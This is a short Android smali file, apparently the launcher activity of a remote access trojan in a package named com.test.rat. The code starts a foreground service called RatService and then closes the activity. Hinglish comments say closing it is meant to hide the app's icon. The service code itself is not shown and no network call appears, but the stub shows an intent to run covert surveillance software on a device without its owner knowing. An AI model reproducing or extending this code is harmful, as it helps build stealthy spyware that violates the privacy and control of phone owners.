.class public Lcom/test/rat/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .registers 4
    
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
    
    # Start service
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/test/rat/RatService;
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    
    # Android 8+ ke liye foreground service start karo
    invoke-virtual {p0, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
    
    # Activity finish karo taaki icon hide ho (optional)
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V
    
    return-void
.end method